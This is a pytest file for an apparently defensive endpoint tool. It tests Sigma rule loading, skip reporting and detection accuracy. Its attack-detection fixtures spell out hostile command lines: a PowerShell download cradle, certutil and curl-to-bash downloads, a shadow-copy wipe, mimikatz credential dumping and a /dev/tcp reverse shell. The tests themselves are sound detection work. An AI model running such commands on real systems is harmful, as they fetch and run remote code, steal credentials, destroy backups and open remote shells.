"""Tests for Sigma rule loading, coverage reporting, and the bundled rule set.

Two things are being protected here:

* the loader must **skip and report** rules it cannot run faithfully, never load
  a rule that silently can never match;
* the bundled rules must actually detect the attacks they claim to, and must
  stay quiet on ordinary activity — a detection rule set is only worth shipping
  if both halves hold.
"""
import textwrap

import pytest

from aegis.core.events import (
    Direction,
    EventSource,
    EventType,
    NetworkEvent,
    ProcessEvent,
)
from aegis.core.models import Severity
from aegis.detection.base import DetectionContext
from aegis.detection.ruleset import BUNDLED_SIGMA_DIR, build_ruleset
from aegis.detection.sigma import load_rules

VALID_RULE = """
title: Encoded PowerShell
id: test-valid-0001
level: high
logsource:
    category: process_creation
detection:
    selection:
        Image|endswith: '\\powershell.exe'
        CommandLine|contains: ' -enc '
    condition: selection
tags:
    - attack.execution
    - attack.t1059.001
"""


def write(tmp_path, name: str, content: str):
    path = tmp_path / name
    path.write_text(textwrap.dedent(content), encoding="utf-8")
    return path


# --------------------------------------------------------------------------- #
# Loading
# --------------------------------------------------------------------------- #
def test_loads_a_valid_rule(tmp_path):
    write(tmp_path, "good.yml", VALID_RULE)
    report = load_rules(tmp_path)
    assert report.loaded_count == 1
    assert report.skipped_count == 0
    assert report.coverage == 1.0


def test_loads_recursively(tmp_path):
    (tmp_path / "windows" / "process").mkdir(parents=True)
    write(tmp_path, "windows/process/a.yml", VALID_RULE)
    write(tmp_path, "windows/process/b.yml", VALID_RULE.replace("test-valid-0001", "b"))
    assert load_rules(tmp_path).loaded_count == 2


def test_accepts_both_yaml_extensions(tmp_path):
    write(tmp_path, "a.yml", VALID_RULE)
    write(tmp_path, "b.yaml", VALID_RULE.replace("test-valid-0001", "b"))
    assert load_rules(tmp_path).loaded_count == 2


def test_ignores_non_rule_files(tmp_path):
    write(tmp_path, "good.yml", VALID_RULE)
    write(tmp_path, "notes.md", "# not a rule")
    write(tmp_path, "script.py", "print('hi')")
    assert load_rules(tmp_path).total == 1


def test_single_file_can_be_loaded(tmp_path):
    path = write(tmp_path, "good.yml", VALID_RULE)
    assert load_rules(path).loaded_count == 1


def test_missing_path_returns_an_empty_report(tmp_path):
    report = load_rules(tmp_path / "nope")
    assert report.total == 0
    assert "No Sigma rules found" in report.summary()


# --------------------------------------------------------------------------- #
# Skipping — with reasons
# --------------------------------------------------------------------------- #
def test_uncollected_logsource_is_skipped_with_a_reason(tmp_path):
    write(tmp_path, "registry.yml", """
        title: Registry Persistence
        logsource:
            category: registry_set
        detection:
            selection:
                TargetObject|contains: 'Run'
            condition: selection
    """)
    report = load_rules(tmp_path)
    assert report.loaded_count == 0
    assert report.skipped_count == 1
    assert "logsource category" in report.skipped[0].reason


def test_rule_needing_unavailable_telemetry_is_skipped(tmp_path):
    write(tmp_path, "hashes.yml", """
        title: Known Bad Hash
        logsource:
            category: process_creation
        detection:
            selection:
                Hashes|contains: 'MD5=1234'
            condition: selection
    """)
    report = load_rules(tmp_path)
    assert report.loaded_count == 0
    assert "unavailable field" in report.skipped[0].reason.lower()


def test_unavailable_field_rules_can_be_loaded_deliberately(tmp_path):
    """Turning off strict fields measures what richer telemetry would unlock."""
    write(tmp_path, "hashes.yml", """
        title: Known Bad Hash
        logsource:
            category: process_creation
        detection:
            selection:
                Hashes|contains: 'MD5=1234'
            condition: selection
    """)
    assert load_rules(tmp_path, strict_fields=False).loaded_count == 1


def test_aggregation_rule_is_skipped(tmp_path):
    write(tmp_path, "agg.yml", """
        title: Brute Force
        logsource:
            category: process_creation
        detection:
            selection:
                Image|endswith: '\\ssh.exe'
            condition: selection | count() > 5
    """)
    report = load_rules(tmp_path)
    assert report.loaded_count == 0
    assert "aggregation" in report.skipped[0].reason


def test_malformed_yaml_is_skipped_not_fatal(tmp_path):
    write(tmp_path, "broken.yml", "title: [unclosed\n  bad: :")
    write(tmp_path, "good.yml", VALID_RULE)
    report = load_rules(tmp_path)
    assert report.loaded_count == 1, "one bad file must not abort the whole load"
    assert report.skipped_count == 1


def test_empty_file_is_skipped(tmp_path):
    write(tmp_path, "empty.yml", "")
    write(tmp_path, "good.yml", VALID_RULE)
    assert load_rules(tmp_path).loaded_count == 1


def test_collection_rules_are_skipped(tmp_path):
    write(tmp_path, "collection.yml", """
        action: global
        title: Global
        logsource:
            category: process_creation
        ---
        detection:
            selection:
                Image: 'x'
            condition: selection
    """)
    report = load_rules(tmp_path)
    assert report.loaded_count == 0
    assert report.skipped_count == 1


# --------------------------------------------------------------------------- #
# Reporting
# --------------------------------------------------------------------------- #
def test_report_groups_skip_reasons(tmp_path):
    for i in range(3):
        write(tmp_path, f"registry{i}.yml", f"""
            title: Registry {i}
            logsource:
                category: registry_set
            detection:
                selection:
                    TargetObject: 'x'
                condition: selection
        """)
    report = load_rules(tmp_path)
    reasons = report.reasons()
    assert sum(reasons.values()) == 3
    assert len(reasons) == 1, "identical causes must collapse into one reason"


def test_report_summary_states_coverage(tmp_path):
    write(tmp_path, "good.yml", VALID_RULE)
    write(tmp_path, "registry.yml", """
        title: Registry
        logsource:
            category: registry_set
        detection:
            selection:
                TargetObject: 'x'
            condition: selection
    """)
    report = load_rules(tmp_path)
    assert report.coverage == 0.5
    summary = report.summary()
    assert "Loaded 1 of 2" in summary
    assert "50%" in summary


# --------------------------------------------------------------------------- #
# Rule set composition
# --------------------------------------------------------------------------- #
def test_builtin_and_sigma_rules_compose():
    rules, report = build_ruleset()
    assert report.loaded_count > 0
    assert len(rules) > report.loaded_count, "built-in rules must still be present"


def test_sigma_can_be_excluded():
    rules, report = build_ruleset(include_bundled_sigma=False)
    assert report.loaded_count == 0
    assert len(rules) > 0


def test_duplicate_rule_ids_are_not_loaded_twice():
    rules, report = build_ruleset(
        include_builtin=False, sigma_paths=[str(BUNDLED_SIGMA_DIR)])
    ids = [r.rule_id for r in report.rules]
    assert len(ids) == len(set(ids))


# --------------------------------------------------------------------------- #
# The bundled rule set, end to end
# --------------------------------------------------------------------------- #
def proc(name, exe, cmdline, parent=""):
    return ProcessEvent(type=EventType.PROCESS_START, source=EventSource.PSUTIL, pid=1,
                        name=name, exe=exe, cmdline=cmdline, raw={"parent_name": parent})


def net(proc_name, ip, port):
    return NetworkEvent(type=EventType.NETWORK_CONNECTION, source=EventSource.PSUTIL,
                        pid=1, process_name=proc_name, protocol="TCP",
                        remote_ip=ip, remote_port=port, direction=Direction.OUTBOUND)


@pytest.fixture(scope="module")
def bundled():
    return load_rules(BUNDLED_SIGMA_DIR).rules


def detect(bundled, event):
    ctx = DetectionContext()
    return [f for f in (r.evaluate(event, ctx) for r in bundled) if f]


def test_every_bundled_rule_loads():
    report = load_rules(BUNDLED_SIGMA_DIR)
    assert report.skipped_count == 0, f"bundled rules must all load: {report.skipped}"
    assert report.loaded_count >= 9


def test_every_bundled_rule_is_attack_mapped(bundled):
    for rule in bundled:
        assert rule.technique, f"{rule.title} has no ATT&CK technique"
        assert rule.tactic, f"{rule.title} has no ATT&CK tactic"


def test_every_bundled_rule_documents_false_positives(bundled):
    for rule in bundled:
        assert rule.sigma.falsepositives, f"{rule.title} documents no false positives"


@pytest.mark.parametrize("label,event,expect_technique", [
    ("encoded powershell",
     proc("powershell.exe", r"C:\W\powershell.exe", "powershell -enc SQBFAFgA"),
     "T1059.001"),
    ("download cradle",
     proc("powershell.exe", r"C:\W\powershell.exe",
          "IEX(New-Object Net.WebClient).DownloadString('http://x/a.ps1')"),
     "T1059.001"),
    ("shadow copy wipe",
     proc("vssadmin.exe", r"C:\W\vssadmin.exe", "vssadmin delete shadows /all /quiet"),
     "T1490"),
    ("certutil download",
     proc("certutil.exe", r"C:\W\certutil.exe",
          "certutil -urlcache -f http://x/a.exe a.exe"),
     "T1105"),
    ("office macro payload",
     proc("powershell.exe", r"C:\W\powershell.exe", "powershell -w hidden",
          parent="winword.exe"),
     "T1566.001"),
    ("curl piped to shell",
     proc("bash", "/bin/bash", "curl -s http://x/i.sh | bash"),
     "T1059.004"),
    ("credential dumping",
     proc("mimikatz.exe", r"C:\T\mimikatz.exe", "mimikatz sekurlsa::logonpasswords"),
     "T1003.001"),
    ("reverse shell",
     proc("bash", "/bin/bash", "bash -i >& /dev/tcp/1.2.3.4/4444 0>&1"),
     "T1059"),
    ("interpreter to c2 port",
     net("powershell.exe", "45.9.1.1", 4444),
     "T1571"),
])
def test_bundled_rules_detect_known_attacks(bundled, label, event, expect_technique):
    findings = detect(bundled, event)
    assert findings, f"{label} went undetected"
    assert any(f.technique == expect_technique for f in findings), (
        f"{label} detected but not mapped to {expect_technique}: "
        f"{[f.technique for f in findings]}"
    )
    assert all(f.severity >= Severity.MEDIUM for f in findings)


@pytest.mark.parametrize("label,event", [
    ("chrome renderer",
     proc("chrome.exe", r"C:\P\chrome.exe", "chrome.exe --type=renderer")),
    ("routine powershell script",
     proc("powershell.exe", r"C:\W\powershell.exe", "powershell -File C:\\backup.ps1")),
    ("powershell reading event log",
     proc("powershell.exe", r"C:\W\powershell.exe",
          "powershell -enc AAAA Get-WinEvent -LogName System")),
    ("explorer launching notepad",
     proc("notepad.exe", r"C:\W\notepad.exe", "notepad.exe a.txt", parent="explorer.exe")),
    ("https to a cdn", net("chrome.exe", "142.250.0.1", 443)),
    ("dns lookup", net("svchost.exe", "1.1.1.1", 53)),
    ("ssh to a server", net("ssh.exe", "10.0.0.5", 22)),
])
def test_bundled_rules_stay_quiet_on_ordinary_activity(bundled, label, event):
    findings = detect(bundled, event)
    assert not findings, f"false positive on {label}: {[f.title for f in findings]}"
